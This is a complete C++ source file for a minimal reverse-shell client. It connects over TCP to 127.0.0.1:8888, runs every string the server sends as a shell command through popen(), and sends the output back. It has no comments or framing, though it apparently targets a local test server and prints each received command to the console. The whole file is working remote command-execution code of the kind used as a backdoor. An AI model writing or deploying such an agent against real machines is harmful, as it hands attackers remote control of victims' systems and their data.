#include <iostream>
#include <thread>
#include <cstring>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <memory>

std::string exec(const char* cmd) {
    std::shared_ptr<FILE> pipe(popen(cmd, "r"), pclose);
    if (!pipe) return "ERROR\n";
    char buffer[128];
    std::string result = "";
    while (fgets(buffer, sizeof(buffer), pipe.get()) != NULL) {
        result += buffer;
    }
    return result;
}

void receive_loop(int clientfd) {
    char buffer[1024];
    while (true) {
        int bytes = recv(clientfd, buffer, sizeof(buffer) - 1, 0);
        if (bytes <= 0) {
            std::cerr << "\nServer disconnected.\n";
            break;
        }
        buffer[bytes] = '\0';

        std::cout << "\n\033[31mServer Command: \033[37m" << buffer << "\n> ";
        std::cout.flush();

        // Execute the received command and get the output
        std::string output = exec(buffer);

        std::cout << output << std::endl;

        // Send the command output back to the server
        if (send(clientfd, output.c_str(), output.length(), 0) < 0) {
            std::cerr << "Failed to send command output\n";
            break;
        }
    }
}

int main() {
    int clientfd = socket(AF_INET, SOCK_STREAM, 0);
    if (clientfd < 0) {
        std::cerr << "Socket creation failed\n";
        return -1;
    }

    sockaddr_in serverAddress{};
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(8888);
    inet_pton(AF_INET, "127.0.0.1", &serverAddress.sin_addr);

    if (connect(clientfd, (sockaddr *)&serverAddress, sizeof(serverAddress)) < 0) {
        std::cerr << "Connection failed\n";
        return -1;
    }

    std::cout << "Connected to server.\n";

    receive_loop(clientfd);

    close(clientfd);
    return 0;
}
